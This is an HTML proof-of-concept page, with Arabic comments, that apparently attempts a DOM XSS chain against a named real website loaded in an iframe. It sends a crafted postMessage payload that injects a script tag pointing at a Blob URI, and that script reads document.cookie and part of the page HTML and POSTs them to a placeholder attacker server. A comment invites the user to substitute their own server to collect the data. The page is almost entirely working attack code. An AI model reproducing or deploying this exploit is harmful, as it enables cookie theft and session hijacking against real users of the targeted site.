<!DOCTYPE html>
<html>
<head>
  <title>☠️ Ultimate XSS Chain PoC</title>
  <meta charset="utf-8">
  <style>
    body { font-family: sans-serif; background: #111; color: #eee; padding: 30px; }
    iframe { border: 2px solid #444; width: 100%; height: 500px; margin-top: 20px; }
  </style>
</head>
<body>
  <h1>🔥 Ultimate DOM XSS Chain via postMessage + Blob + Auto-Interaction</h1>
  <p>Sending malicious payload with DOM access + CSP bypass + interaction spoofing...</p>

  <iframe id="target" src="https://thebrowser.company/" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>

  <script>
    const attackerServer = "https://evil.example.com/log"; // ← غيّره إلى سيرفرك إذا أردت استقبال البيانات

    // 1️⃣: كود يتم تحميله من Blob URI
    const scriptContent = `
      // Simulate user action
      document.body.click?.();
      document.body.focus?.();

      // Try to leak DOM + cookies
      const data = {
        cookie: document.cookie,
        html: document.documentElement.outerHTML.slice(0, 1000)
      };

      fetch('${attackerServer}', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(data)
      });

      alert('🔥 XSS via Blob URI + Auto interaction + DOM exfiltration');
    `;

    // 2️⃣: إنشاء Blob URI لتجاوز CSP
    const blob = new Blob([scriptContent], { type: "text/javascript" });
    const blobUrl = URL.createObjectURL(blob);

    // 3️⃣: إعداد الرسالة
    const payload = {
      message: "OB_SHOULD_SHOW_PICKER",
      content: {
        marketerId: [
          `<script src="${blobUrl}"></script>`
        ]
      }
    };

    // 4️⃣: إرسال postMessage بعد تحميل iframe
    const iframe = document.getElementById("target");
    iframe.onload = () => {
      console.log("✅ iframe loaded");
      setTimeout(() => {
        console.log("🚀 Sending advanced XSS payload...");
        iframe.contentWindow.postMessage(payload, "*");
      }, 1000);
    };
  </script>
</body>
</html>
